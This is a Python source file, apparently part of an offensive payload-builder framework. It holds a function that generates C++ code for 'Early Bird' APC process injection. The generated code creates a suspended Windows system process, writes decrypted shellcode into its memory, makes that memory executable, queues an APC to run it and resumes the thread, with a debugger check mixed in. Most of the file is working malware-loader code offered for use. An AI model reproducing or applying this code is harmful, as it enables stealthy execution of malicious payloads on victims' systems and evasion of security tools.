import secrets

from Encryption.Choose_Decryption import Choose_Decryption
from Evasion.Obfuscator import obfuscator

def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,key_hex,encryption_type,array,size):
    EarlyBird_Injection=f"""

            if (!executed)
            {{
                
                
                executed = TRUE;

                LPVOID allocation_start;
                SIZE_T allocation_size = sizeof({shellcode_var});
                NTSTATUS status = NULL;
                
                
                allocation_start = nullptr;

                char {key_var}[] = {key_hex};

                STARTUPINFOA si = {{ 0 }};
                PROCESS_INFORMATION pi = {{ 0 }};
                
                
                CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
                HANDLE victimProcess = pi.hProcess;
                HANDLE threadHandle = pi.hThread;
               
                            /*++

                    Routine Description:

                        CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
                        it can be used to check if a remote process is being debugged. However,
                        we can also use this as another method for checking if our own process
                        is being debugged. This API internally calls the NTDLL export
                        NtQueryInformationProcess function with the PROCESSINFOCLASS set to
                        7 (ProcessDebugPort).

                    Arguments:
                        None
                    Return Value:

                        TRUE - if debugger was detected
                        FALSE - otherwise
                    --*/
                BOOL bIsDbgPresent = FALSE;
                DWORD oldProtect= NULL;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
                // Allocate Virtual Memory 
                NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                
              
               {Choose_Decryption(encryption_type,xor_func,shellcode_var,key_var)}

                // Copy shellcode into allocated memory
                NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
                NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);
                
                
                NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
                NtResumeThread(threadHandle, NULL);
                
                
                return 0;
            }}
    """
    return EarlyBird_Injection
